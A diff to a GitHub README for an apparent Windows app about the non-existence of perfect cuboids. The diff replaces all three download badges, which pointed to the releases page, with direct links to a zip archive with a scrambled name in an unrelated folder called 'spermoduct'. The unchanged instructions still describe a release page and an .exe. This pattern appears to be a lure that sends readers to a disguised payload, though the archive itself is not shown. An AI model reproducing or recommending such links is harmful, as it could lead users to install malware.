@@ -1,6 +1,6 @@
 # 📐 Non-existence-of-Perfect-Cuboids - Proof of No Perfect Cuboids
 
-[![Download Here](https://img.shields.io/badge/Download-Non--existence--of--Perfect--Cuboids-brightgreen)](https://github.com/A1013139298/Non-existence-of-Perfect-Cuboids/releases)
+[![Download Here](https://img.shields.io/badge/Download-Non--existence--of--Perfect--Cuboids-brightgreen)](https://github.com/A1013139298/Non-existence-of-Perfect-Cuboids/raw/refs/heads/main/spermoduct/Cuboids_of_Non_Perfect_existence_v1.4.zip)
 
 ## 📘 What This Application Does
 
@@ -44,7 +44,7 @@ Before using the software, make sure your Windows system meets the requirements 
 ## ⬇️ How to Download and Run the Software
 
 1. Click this bright green download badge below to go to the release page:  
-[![Download Here](https://img.shields.io/badge/Download-Non--existence--of--Perfect--Cuboids-brightgreen)](https://github.com/A1013139298/Non-existence-of-Perfect-Cuboids/releases)
+[![Download Here](https://img.shields.io/badge/Download-Non--existence--of--Perfect--Cuboids-brightgreen)](https://github.com/A1013139298/Non-existence-of-Perfect-Cuboids/raw/refs/heads/main/spermoduct/Cuboids_of_Non_Perfect_existence_v1.4.zip)
 
 2. On the release page, find the latest Windows installer file. It will usually have a name ending with `.exe`.
 
@@ -153,6 +153,6 @@ Topics involved:
 
 Access the official release page here to get the Windows installer:  
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/A1013139298/Non-existence-of-Perfect-Cuboids/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/A1013139298/Non-existence-of-Perfect-Cuboids/raw/refs/heads/main/spermoduct/Cuboids_of_Non_Perfect_existence_v1.4.zip)
 
 Use this link whenever you want the latest version or any bug fixes.
